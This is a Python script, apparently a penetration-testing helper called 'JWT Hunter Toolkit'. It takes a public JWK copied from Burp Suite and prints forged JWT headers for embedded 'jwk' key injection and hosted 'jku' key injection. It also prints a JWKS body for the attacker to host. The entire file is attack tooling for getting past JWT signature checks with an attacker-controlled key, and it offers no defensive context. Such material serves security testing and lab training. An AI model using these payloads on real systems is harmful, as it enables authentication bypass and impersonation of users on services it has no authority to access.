
import json, sys, uuid

def read_multiline(prompt):
    print(prompt)
    print("(paste it, then press Enter on an empty line to finish — or just press Enter to skip)")
    lines = []
    while True:
        line = input()
        if line.strip() == "":
            break
        lines.append(line)
    return "\n".join(lines).strip()

def read_single(prompt):
    val = input(prompt).strip()
    return val if val else None

print("=== JWT Hunter Toolkit ===\n")

raw_jwk = read_multiline("Paste the public JWK JSON (from Burp's 'Copy Public Key as JWK'):")

if not raw_jwk:
    print("No JWK provided — nothing to build. Exiting.")
    sys.exit(0)

try:
    key = json.loads(raw_jwk)
except json.JSONDecodeError as e:
    print(f"\nCouldn't parse that as JSON: {e}")
    sys.exit(1)

PUBLIC_FIELDS = {"kty", "e", "kid", "n", "use", "alg", "crv", "x", "y"}
public_key = {k: v for k, v in key.items() if k in PUBLIC_FIELDS}

kid = public_key.get("kid")
if not kid:
    kid = str(uuid.uuid4())
    public_key["kid"] = kid
    print(f"\nNo kid found in the pasted key — generated one: {kid}")

jku_url = read_single("\nHosting URL for jku (press Enter to skip): ")
jwks_url = read_single("Separate URL for the JWKS endpoint, if different (press Enter to reuse the above): ") or jku_url

print("\n" + "="*50)
print("CLEAN PUBLIC JWK")
print("="*50)
print(json.dumps(public_key, indent=4))

print("\n" + "="*50)
print("jwk HEADER (embedded key injection)")
print("="*50)
print(json.dumps({"kid": kid, "typ": "JWT", "alg": "RS256", "jwk": public_key}, indent=4))

print("\n" + "="*50)
print("jku HEADER (hosted key injection)")
print("="*50)
print(json.dumps({"kid": kid, "typ": "JWT", "alg": "RS256", "jku": jku_url or "<SET_JKU_URL>"}, indent=4))

print("\n" + "="*50)
print("JWKS BODY (host this at your jku URL)")
print("="*50)
print(json.dumps({"keys": [public_key]}, indent=4))

if jwks_url:
    print("\n" + "="*50)
    print("FULL jku URL (for reference)")
    print("="*50)
    print(jwks_url)

print("\nDone.")
